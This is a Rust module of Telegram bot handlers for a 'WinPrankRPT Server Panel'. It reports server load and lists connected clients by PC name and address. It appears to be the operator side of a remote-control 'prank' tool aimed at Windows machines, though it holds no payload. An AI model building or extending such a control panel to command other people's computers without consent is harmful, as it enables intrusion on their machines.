pub mod handlers {
    use std::sync::Arc;
    use tokio::sync::{Mutex};
    use sysinfo::{System};
    use teloxide::Bot;
    use teloxide::payloads::SendMessageSetters;
    use teloxide::prelude::{Message, Requester, ResponseResult};
    use teloxide::types::{InlineKeyboardButton, InlineKeyboardMarkup, ParseMode};
    use crate::app::app::AppState;
    use crate::telegram::commands::telegram_commands::Command;

    async fn get_system_status() -> String {
        let mut sys = System::new_all();
        sys.refresh_all();
        let total_mem = sys.total_memory() / 1024 / 1024;
        let used_mem = sys.used_memory() / 1024 / 1024;
        let cpu_usage: f32 = sys.cpus().iter().map(|cpu| cpu.cpu_usage()).sum::<f32>()
            / sys.cpus().len() as f32;

        let cpu_str = format!("{:.2}", cpu_usage).replace(".", "\\.");

        format!(
            "📊 *CPU:* `{cpu_str}%` \n\
             💾 *RAM:* `{used_mem}/{total_mem} MB`"
        )
    }

    pub async fn answer(bot: Bot, msg: Message, cmd: Command, state: Arc<Mutex<AppState>>) -> ResponseResult<()> {
        let state = state.lock().await.clone();

        match cmd {
            Command::Info => {
                if msg.chat.id.0 != state.config.telegram.admin_chat_id {return Ok(())}
                let stats = get_system_status().await;
                let online_clients = state.clients.len();
                let loaded_scripts = state.scripts.unwrap_or_default().len();

                let hello_text = format!(
                    "─── *☢️WinPrankRPT Server Panel☢️* ───\n\
                    🟢 Статус сервера: `Онлайн` \n\
                    💻 Клиенты в сети: {online_clients} \n\
                    📜 Загруженные скрипты: {loaded_scripts} \n\
                    🚀 Версия: `1\\.0\\.0` \n\n\
                    🖥 *Статус Системы*\n\
                    {stats}\n\n\
                    _Доступные команды:_\n\
                    ───────────────────────────"
                );

                bot.send_message(msg.chat.id, hello_text)
                    .parse_mode(ParseMode::MarkdownV2)
                    .await?;
            },
            Command::Start => {
                if msg.chat.id.0 != state.config.telegram.admin_chat_id {
                    bot.send_message(msg.chat.id, "Вы не админ! Проверьте Config.toml").await?;
                    return Ok(())
                }
                bot.send_message(msg.chat.id, "Бот запущен. Жми /info").await?;
            },
            Command::GetOnlineClients => {
                if msg.chat.id.0 != state.config.telegram.admin_chat_id {return Ok(())}
                if state.clients.len() > 0 {
                    // generating buttons
                    let mut clients_button = InlineKeyboardMarkup::default();
                    let max = 3;
                    let mut line: Vec<InlineKeyboardButton> = Vec::new();
                    for client in &state.clients {
                        line.push(InlineKeyboardButton::callback(format!("{}({})", client.pc_name, client.address),format!("open_client|{}", client.id)));
                        if line.len() == max {
                            clients_button.inline_keyboard.push(line.clone());
                            line.clear();
                        }
                    }

                    if clients_button.inline_keyboard.len() == 0 { clients_button.inline_keyboard.push(line.clone()); }
                    bot.send_message(msg.chat.id, format!("Клиенты в сети (всего: {})", state.clients.len())).reply_markup(clients_button).parse_mode(ParseMode::Html).await?;
                } else {
                    bot.send_message(msg.chat.id, "Сейчас нету клиентов в сети").await?;
                }
            }
            Command::MyId => {
                bot.send_message(msg.chat.id, msg.chat.id.0.to_string()).await?;
            }
        };

        Ok(())
    }
}